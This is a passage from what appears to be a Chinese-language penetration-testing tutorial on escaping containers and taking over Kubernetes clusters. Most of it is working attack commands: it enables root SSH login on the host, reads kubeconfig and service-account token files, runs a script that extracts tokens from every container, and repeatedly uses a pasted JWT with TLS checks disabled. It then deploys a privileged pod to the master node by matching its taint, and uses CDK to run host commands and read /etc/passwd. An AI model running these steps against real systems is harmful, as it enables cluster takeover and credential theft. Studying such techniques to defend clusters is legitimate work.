AuthorizedKeysFile .ssh/authorized_keys

// 一条命令配置
echo -e "PubkeyAuthentication yes\nPermitRootLogin yes\nAuthorizedKeysFile .ssh/authorized_keys" >> /mnt/host_root/etc/ssh/sshd_config && systemctl restart sshd

// 此时在VPS上通过私钥即可SSH连接宿主机
ssh -i 私钥文件 root@ip
```

# 六、通过高权限Token获取K8S集群管理员权限

  

## 判断当前环境

  
●在容器逃逸出来以后，可以先判断当前是否有K8S环境  
  

```yaml
// 判断当前是否为K8S环境 
kubectl version --client --short

// 判断当前是否为主节点
ps aux | grep -q "[k]ube-apiserver" && echo "Master Node" || echo "Worker Node"

// 定位主节点
kubectl cluster-info   //未找到有效的集群配置，要么无集群，要么配置错误
```

![](https://imglink.cc/cdn/-yEekc2sao.png)

  
  

## 票据文件

  
● 在K8S节点中存在`/root/.kube/config`（不一定存在）和`/etc/kubernetes/kubelet.conf`这两个票据文件，票据中包含`certificate-authority-data:`这个字段它是集群的“根信任证书”，作用是验证Kubernetes API Server 的身份合法性：  
○ 当kubelet（通过`kubelet.conf`）或 kubectl（通过`/root/.kube/config`）向API Server发起请求时，API Server会出示自己的服务端证书  
○ 客户端（kubelet/kubectl）会用`certificate-authority-data`里的CA证书去校验API Server的证书，只有确认API Server的证书是由这个CA签发的，才会建立加密连接，避免中间人攻击（防止连接到伪造的 API Server）  

![](https://imglink.cc/cdn/su9jEY7Hy2.png)

  
  

```
- 在这两个票据文件中，如果user是`default-auth`的话，就说明权限不会太大（拼接命令查询到的信息有限、执行一些操作的时候权限不足等）
```

![](https://imglink.cc/cdn/oIQuCp7uSc.png)

  
  
●拿到票据后可以通过拼接命令进行使用  
  

```yaml
// 获取默认命名空间（default）下的所有Pod列表
kubectl --kubeconfig /etc/kubernetes/kubelet.conf get pods

// 获取集群中所有命名空间下的所有Pod列表
kubectl --kubeconfig /etc/kubernetes/kubelet.conf get pods --all-namespaces

// 交互式进入Pod的shell（有时候权限不足，导致无法进入）
kubectl --kubeconfig /etc/kubernetes/kubelet.conf exec -it escape-pod -- sh  // 没有指定命令空间，默认为default命名空间
kubectl --kubeconfig /etc/kubernetes/kubelet.conf exec -it escape-to-host -n escape-ns -- bash    // 指定进入escape-ns命令空间下的escape-to-host
kubectl --kubeconfig /etc/kubernetes/kubelet.conf exec -it steal-token-pod -n escape-ns -- sh
```

## Service Account

  
● 子节点的票据有时候可能导致越权，而这是少数情况，但是Pod内部可能存有高权限的服务账户`Service Account（SA）`  
● Service Account（服务账户）是K8S为Pod内的应用程序、进程设计的身份标识，默认情况下，每个命名空间都会有一个`default`SA，权限极低，但是管理员可以创建自定义SA，并给它绑定超高权限，所以Pod内部可能存有高权限的SA  
● 如果该SA被通过绑定了K8S内置的超级集群角色，就拥有了集群所有资源的操作权限，K8S会自动把该高权限SA的JWT认证Token，默认挂载到Pod内部`/var/run/secrets/kubernetes.io/serviceaccount`目录下，攻击者只要能进入该Pod，即可直接读取这个高权限Token，用该Token向API Server发起请求时，API Server会验证Token合法性并匹配其SA的RBAC权限，确认具备`cluster-admin`权限后，便允许执行查看/修改所有资源、操作节点、管理全集群Secret等所有管理员级操作，最终完全掌控整个K8S集群  
●在Pod内部查看Token  
  

```yaml
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

![](https://imglink.cc/cdn/VApLy2y3e8.png)

  
  
●通过Token获取K8S集群管理员权限  
  

```yaml
// 命令模板
kubectl --insecure-skip-tls-verify=true --server="https://主节点ip:6443/" --token="token" get secrets --all-namespaces

// 获取集群中所有命名空间下的所有Pod列表
kubectl --insecure-skip-tls-verify=true --server="https://10.10.10.144:6443/" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IjdYTU1lNmxHR0V5dzVYc0I2bUdFMi16RzNuVTg2Y3BQM1pLbV9PSVFHdjAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlc2NhcGUtbnMiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2x1c3Rlci1hZG1pbi1zYS10b2tlbi04NHBwNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjbHVzdGVyLWFkbWluLXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzNlMDFhMzYtOTFhZi00OGUzLTgyMmYtNGEwMzMyY2U1OWQxIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmVzY2FwZS1uczpjbHVzdGVyLWFkbWluLXNhIn0.RpE43KWwwPkc6udxn0IgLyj4z4gTMm1kqlXqX8R-DzeHSU1Xr2qwJg1aYcxGnRXt-NIwslY9EgMpmSRf2AY5dBRMk37xHfGouUp-nrJMLFKQU6ZhtyTcefDdhdBYUW8G7Ce_1hDYOWBQwlHENOkvCbdLxgAx7Vy7W5x1OvIHN1x5y2DXqE-SolJrU6v3Ay4z6Kb49RFfNhUuD8uqIWsC1N7zkM1d5rm4CYdCfLVGN3M8Xe-JMPxKff79bKfUH5cNaFuW5Mp8iDvNwSychT1UCiRLCHXO0KgKFICuD3Ji5xj2zET8EeAuMLcyh-efEwk8krenRYMy6HPIDuPcb4-jGQ" get secrets --all-namespaces
```

![](https://imglink.cc/cdn/Yq95WC0ZmG.png)

  
  
●Token权限不足的情况  
  

![](https://imglink.cc/cdn/_W9TvDSbJg.png)

  
  
● 通过bash脚本批量提取Token（记得`chmod +x`）  

```yaml
#!/bin/bash
set -euo pipefail  # 开启严格模式，提升脚本健壮性

# 脚本标题与执行时间
echo -e "\033[1;34m=============================================\033[0m"
echo -e "\033[1;34m          K8s容器Token提取工具                \033[0m"
echo -e "\033[1;34m=============================================\033[0m"
echo -e "执行时间: $(date +'%Y-%m-%d %H:%M:%S')\n"

# 1. 获取运行中的容器列表（包含ID、名称、镜像）
# 先检查是否有运行中的容器
running_containers=$(docker ps --format "{{.ID}}\t{{.Names}}\t{{.Image}}" 2>/dev/null)
if [ -z "$running_containers" ]; then
    echo -e "\033[1;33m⚠️  未检测到任何运行中的Docker容器\033[0m"
    exit 0
fi

# 统计容器数量
container_count=$(echo "$running_containers" | wc -l)
echo -e "\033[1;32m✅  共检测到 $container_count 个运行中的容器\033[0m"
echo -e "---------------------------------------------\n"

# 2. 遍历每个容器，提取Token并格式化输出
echo "$running_containers" | while IFS=$'\t' read -r container_id container_name container_image; do
    # 容器基础信息（带颜色区分）
    echo -e "\033[1;36m【容器信息】\033[0m"
    echo -e "  容器ID:   \033[1;37m$container_id\033[0m"
    echo -e "  容器名称: \033[1;37m$container_name\033[0m"
    echo -e "  镜像名称: \033[1;37m$container_image\033[0m"
    echo -e "\033[1;36m【Token提取结果】\033[0m"

    # 尝试提取Token（优化错误重定向，区分不同错误类型）
    token=$(docker exec "$container_id" cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1)
    exit_code=$?

    if [ $exit_code -eq 0 ] && [ -n "$token" ]; then
        # Token提取成功
        echo -e "  ✅  Token获取成功:"
        echo -e "  ----------------------------------------"
        echo -e "\033[1;32m$token\033[0m"
        echo -e "  ----------------------------------------"
    elif [ $exit_code -eq 127 ]; then
        # 命令执行失败（如容器内无cat命令）
        echo -e "  ❌  错误: 容器内执行命令失败（可能无cat工具）"
    elif [ "$(echo "$token" | grep -c "No such file or directory")" -gt 0 ]; then
        # 文件不存在
        echo -e "  ❌  错误: 容器内无K8s ServiceAccount Token文件"
    else
        # 其他未知错误
        echo -e "  ❌  未知错误: $token"
    fi

    # 容器分隔线
    echo -e "\033[1;30m-----------------------------------------------------------\033[0m\n"
done

# 脚本结束提示
echo -e "\033[1;34m=============================================\033[0m"
echo -e "\033[1;34m              提取完成 ✨                     \033[0m"
echo -e "\033[1;34m=============================================\033[0m"
```

![](https://imglink.cc/cdn/qQeq64y7Fw.png)

  
  

# 七、污点横移（上线主节点）

  
●在获取了高权限的Token，可以利用污点容忍机制在K8S主节点部署一个恶意Pod，然后逃逸到主节点  
  
●查看节点上是否有污点并判断容忍度  
  

```yaml
// 模板
kubectl --insecure-skip-tls-verify=true --server="https://主节点ip:6443/" --token="token" describe node <节点名称> | grep Taints -A 2

// 查看主节点是否存在污点
kubectl --insecure-skip-tls-verify=true --server="https://10.10.10.144:6443/" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IjdYTU1lNmxHR0V5dzVYc0I2bUdFMi16RzNuVTg2Y3BQM1pLbV9PSVFHdjAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlc2NhcGUtbnMiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2x1c3Rlci1hZG1pbi1zYS10b2tlbi04NHBwNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjbHVzdGVyLWFkbWluLXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzNlMDFhMzYtOTFhZi00OGUzLTgyMmYtNGEwMzMyY2U1OWQxIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmVzY2FwZS1uczpjbHVzdGVyLWFkbWluLXNhIn0.RpE43KWwwPkc6udxn0IgLyj4z4gTMm1kqlXqX8R-DzeHSU1Xr2qwJg1aYcxGnRXt-NIwslY9EgMpmSRf2AY5dBRMk37xHfGouUp-nrJMLFKQU6ZhtyTcefDdhdBYUW8G7Ce_1hDYOWBQwlHENOkvCbdLxgAx7Vy7W5x1OvIHN1x5y2DXqE-SolJrU6v3Ay4z6Kb49RFfNhUuD8uqIWsC1N7zkM1d5rm4CYdCfLVGN3M8Xe-JMPxKff79bKfUH5cNaFuW5Mp8iDvNwSychT1UCiRLCHXO0KgKFICuD3Ji5xj2zET8EeAuMLcyh-efEwk8krenRYMy6HPIDuPcb4-jGQ" describe node k8s-master | grep Taints -A 2
```

![](https://i.im.ge/QMVBErM/p2m-0d717b84ea.png)

  
  
● 查询到的污点信息是`security=high:NoSchedule`，分解为：  

```yaml
key: security

value: high

effect: NoSchedule
```

●因此即将在主节点上布置的Pod中的容忍度应该这样配置  
  

```yaml
spec:
  tolerations:
  - key: "security"        # 必须与污点的key完全一致
    operator: "Equal"      # 操作符为Equal，表示需要精确匹配value
    value: "high"          # 必须与污点的value完全一致
    effect: "NoSchedule"   # 必须与污点的effect完全一致
```

●在主节点创建一个可以容器逃逸的Pod  
  
○创建yaml文件  
  

```yaml
cat > attack-pod.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: attack-pod
  namespace: default
spec:
  # 1. 调度与容忍：突破污点，强制部署到主节点
  nodeName: k8s-master
  tolerations:
  - key: "security"
    operator: "Equal"
    value: "high"
    effect: "NoSchedule"

  # 2. 容器配置：功能完整的攻击负载
  containers:
  - name: attacker
    image: ubuntu:22.04
    # 启动时安装工具并保持运行
    command: ["/bin/bash", "-c", "apt-get update && apt-get install -y curl wget net-tools && sleep infinity"]
    securityContext:
      privileged: true                # 特权模式，便于后续逃逸
      allowPrivilegeEscalation: true
    resources:                        # 资源限制，与原配置一致
      limits:
        cpu: "0.5"
        memory: "512Mi"
      requests:
        cpu: "0.1"
        memory: "128Mi"
  serviceAccountName: default
  restartPolicy: Always
EOF
```

![](https://i.im.ge/QMVBAVh/p2m-88e81b0adf.png)

  
  

```
- 创建Pod
```

```yaml
// 模板
kubectl --insecure-skip-tls-verify=true --server="https://主节点ip:6443/" --token="" apply -f xxx.yaml

// 通过yaml创建Pod
kubectl --insecure-skip-tls-verify=true --server="https://10.10.10.144:6443/" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IjdYTU1lNmxHR0V5dzVYc0I2bUdFMi16RzNuVTg2Y3BQM1pLbV9PSVFHdjAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlc2NhcGUtbnMiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2x1c3Rlci1hZG1pbi1zYS10b2tlbi04NHBwNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjbHVzdGVyLWFkbWluLXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzNlMDFhMzYtOTFhZi00OGUzLTgyMmYtNGEwMzMyY2U1OWQxIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmVzY2FwZS1uczpjbHVzdGVyLWFkbWluLXNhIn0.RpE43KWwwPkc6udxn0IgLyj4z4gTMm1kqlXqX8R-DzeHSU1Xr2qwJg1aYcxGnRXt-NIwslY9EgMpmSRf2AY5dBRMk37xHfGouUp-nrJMLFKQU6ZhtyTcefDdhdBYUW8G7Ce_1hDYOWBQwlHENOkvCbdLxgAx7Vy7W5x1OvIHN1x5y2DXqE-SolJrU6v3Ay4z6Kb49RFfNhUuD8uqIWsC1N7zkM1d5rm4CYdCfLVGN3M8Xe-JMPxKff79bKfUH5cNaFuW5Mp8iDvNwSychT1UCiRLCHXO0KgKFICuD3Ji5xj2zET8EeAuMLcyh-efEwk8krenRYMy6HPIDuPcb4-jGQ" apply -f attack-pod.yaml
```

![](https://i.im.ge/QMVBy68/p2m-9e83fd0a87.png)

  
  
●验证是否创建成功  
  

```yaml
// 模板
kubectl --insecure-skip-tls-verify=true --server="https://主节点ip:6443/" --token="" get pods

// 查看是否创建成功
kubectl --insecure-skip-tls-verify=true --server="https://10.10.10.144:6443/" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IjdYTU1lNmxHR0V5dzVYc0I2bUdFMi16RzNuVTg2Y3BQM1pLbV9PSVFHdjAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlc2NhcGUtbnMiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2x1c3Rlci1hZG1pbi1zYS10b2tlbi04NHBwNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjbHVzdGVyLWFkbWluLXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzNlMDFhMzYtOTFhZi00OGUzLTgyMmYtNGEwMzMyY2U1OWQxIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmVzY2FwZS1uczpjbHVzdGVyLWFkbWluLXNhIn0.RpE43KWwwPkc6udxn0IgLyj4z4gTMm1kqlXqX8R-DzeHSU1Xr2qwJg1aYcxGnRXt-NIwslY9EgMpmSRf2AY5dBRMk37xHfGouUp-nrJMLFKQU6ZhtyTcefDdhdBYUW8G7Ce_1hDYOWBQwlHENOkvCbdLxgAx7Vy7W5x1OvIHN1x5y2DXqE-SolJrU6v3Ay4z6Kb49RFfNhUuD8uqIWsC1N7zkM1d5rm4CYdCfLVGN3M8Xe-JMPxKff79bKfUH5cNaFuW5Mp8iDvNwSychT1UCiRLCHXO0KgKFICuD3Ji5xj2zET8EeAuMLcyh-efEwk8krenRYMy6HPIDuPcb4-jGQ" get pods
```

![](https://i.im.ge/QMVBx0Y/p2m-8630b6373a.png)

  
  
●进入Pod，然后进行逃逸（与前面的特权模式下挂载目录逃逸模式一致）  
  

```yaml
// 模板
kubectl --insecure-skip-tls-verify=true --server="https://主节点ip:6443/" --token="" exec Pod名称 -it -- bash

// 进入刚创建的Pod
kubectl --insecure-skip-tls-verify=true --server="https://10.10.10.144:6443/" --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IjdYTU1lNmxHR0V5dzVYc0I2bUdFMi16RzNuVTg2Y3BQM1pLbV9PSVFHdjAifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlc2NhcGUtbnMiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiY2x1c3Rlci1hZG1pbi1zYS10b2tlbi04NHBwNCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjbHVzdGVyLWFkbWluLXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzNlMDFhMzYtOTFhZi00OGUzLTgyMmYtNGEwMzMyY2U1OWQxIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmVzY2FwZS1uczpjbHVzdGVyLWFkbWluLXNhIn0.RpE43KWwwPkc6udxn0IgLyj4z4gTMm1kqlXqX8R-DzeHSU1Xr2qwJg1aYcxGnRXt-NIwslY9EgMpmSRf2AY5dBRMk37xHfGouUp-nrJMLFKQU6ZhtyTcefDdhdBYUW8G7Ce_1hDYOWBQwlHENOkvCbdLxgAx7Vy7W5x1OvIHN1x5y2DXqE-SolJrU6v3Ay4z6Kb49RFfNhUuD8uqIWsC1N7zkM1d5rm4CYdCfLVGN3M8Xe-JMPxKff79bKfUH5cNaFuW5Mp8iDvNwSychT1UCiRLCHXO0KgKFICuD3Ji5xj2zET8EeAuMLcyh-efEwk8krenRYMy6HPIDuPcb4-jGQ" exec attack-pod -it -- bash
```

![](https://i.im.ge/QMVB3gD/p2m-58347a5c0f.png)

  
  
●补充，如果权限足够，但是没有污点，可以尝试通过Token创建污点  
  

```yaml
kubectl --insecure-skip-tls-verify=true --server="https://主节点ip:6443/" --token="" taint nodes 主节点名称 security=high:NoSchedule
```

# 八、CDK工具

  
●CDK是一款开源的零依赖容器渗透工具包，旨在不同精简容器中提供稳定的渗透能力，无需任何操作系统依赖，主要包含一下模块  
  
○Evaluate: 容器内部信息收集，以发现潜在的弱点便于后续利用  
  
○Exploit: 提供容器逃逸、持久化、横向移动等利用方式  
  
○Tool: 修复渗透过程中常用的linux命令以及与Docker/K8s API交互的命令  
  
● 下载地址：[https://github.com/cdk-team/CDK/releases/](https://github.com/cdk-team/CDK/releases/)  
●常用命令（传到Pod里面使用）  
  

```yaml
// 在容器内部进行信息搜集，寻找可用的逃逸点
./cdk_linux_amd64 evaluate

// 全盘路径扫描，在路径中匹配敏感词来识别敏感文件，如：docker.sock、.git、.kube等
./cdk_linux_amd64 evaluate --full
```

![](https://imglink.cc/cdn/PA1PCWgLuD.png)

  
  

```yaml
// 执行宿主机的命令
./cdk_linux_amd64 run mount-cgroup "你要执行的宿主机命令"
./cdk_linux_amd64 run mount-cgroup "cat /etc/hosts"
```

![](https://imglink.cc/cdn/Fby4B9Gpln.png)

  
  

```yaml
// 读取宿主机文件
./cdk_linux_amd64 run cap-dac-read-search /etc/hostname /etc/passwd
```

![](https://imglink.cc/cdn/-sk-__P9hJ.png)

  
  
● 还有其他的使用方式，可以通过`-h`参数查看  

![](https://imglink.cc/cdn/5fYih1sTCC.png)
